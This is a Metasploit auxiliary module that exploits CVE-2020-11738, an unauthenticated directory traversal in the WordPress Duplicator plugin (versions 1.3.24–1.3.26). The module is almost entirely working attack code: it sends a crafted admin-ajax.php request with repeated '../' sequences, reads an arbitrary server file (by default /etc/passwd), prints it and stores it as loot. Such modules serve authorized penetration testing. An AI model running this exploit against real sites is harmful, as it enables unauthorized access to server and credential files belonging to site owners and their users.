##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Duplicator File Read Vulnerability',
        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin
          'Duplicator' version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.
          This vulnerability was being actively exploited when it was discovered.
        },
        'References' => [
          ['CVE', '2020-11738'],
          ['WPVDB', '10078'],
          ['URL', 'https://snapcreek.com/duplicator/docs/changelog']
        ],
        'Author' => [
          'Ramuel Gall', # Vulnerability discovery
          'Hoa Nguyen - SunCSR Team' # Metasploit module
        ],
        'DisclosureDate' => '2020-02-19',
        'License' => MSF_LICENSE
      )
    )

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 5])
      ]
    )
  end

  def check
    check_plugin_version_from_readme('duplicator_download', '1.3.27', '1.3.24')
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ %r{^/}

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_get' =>
                    {
                      'action' => 'duplicator_download',
                      'file' => "#{traversal}#{filename}"
                    }
    })

    fail_with Failure::Unreachable, 'Connection failed' unless res
    fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200
    fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.length.zero?

    print_status('Downloading file...')
    print_line("\n#{res.body}\n")

    fname = datastore['FILEPATH']

    path = store_loot(
      'duplicator.traversal',
      'text/plain',
      ip,
      res.body,
      fname
    )
    print_good("File saved in: #{path}")
  end
end
